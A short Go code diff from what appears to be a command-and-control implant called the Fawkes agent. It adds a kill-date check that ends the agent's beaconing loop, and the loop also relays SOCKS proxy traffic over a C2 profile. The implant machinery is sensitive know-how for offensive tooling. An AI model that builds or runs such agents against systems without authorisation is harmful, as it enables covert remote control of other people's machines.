@@ -178,12 +178,12 @@ func runAgent() {
 
 	// Start main execution loop - run directly (not as goroutine) so DLL exports block properly
 	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])
-	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt)
+	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt, killDateInt64)
 	usePadding() // Reference embedded padding to prevent compiler stripping
 	log.Printf("[INFO] Fawkes agent shutdown complete")
 }
 
-func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int) {
+func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, killDateUnix int64) {
 	// Main execution loop
 	retryCount := 0
 	for {
@@ -192,6 +192,11 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 			log.Printf("[INFO] Context cancelled, exiting main loop")
 			return
 		default:
+			// Enforce kill date every cycle — exit silently if past expiry
+			if killDateUnix > 0 && time.Now().Unix() > killDateUnix {
+				log.Printf("[INFO] Kill date reached, exiting")
+				return
+			}
 			// Drain any pending outbound SOCKS data to include in this poll
 			outboundSocks := socksManager.DrainOutbound()
 
